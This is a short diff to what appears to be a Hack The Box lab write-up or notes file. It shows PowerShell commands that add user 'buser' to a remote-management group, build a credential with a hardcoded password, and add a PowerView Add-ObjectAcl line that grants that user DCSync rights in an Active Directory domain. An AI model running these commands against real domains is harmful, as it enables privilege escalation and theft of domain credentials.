@@ -45,6 +45,7 @@ net localgroup "Remote Management Users" buser /add
 
 $password = ConvertTo-SecureString "Passw0rd" -AsPlainText -Force
 $cred = New-Object System.Management.Automation.PSCredential ('htb\buser', $password)
+Add-ObjectAcl -PrincipalIdentity buser -Credential $cred  -Rights DCSync -Verbose
 ```
 CyberChef
 ```
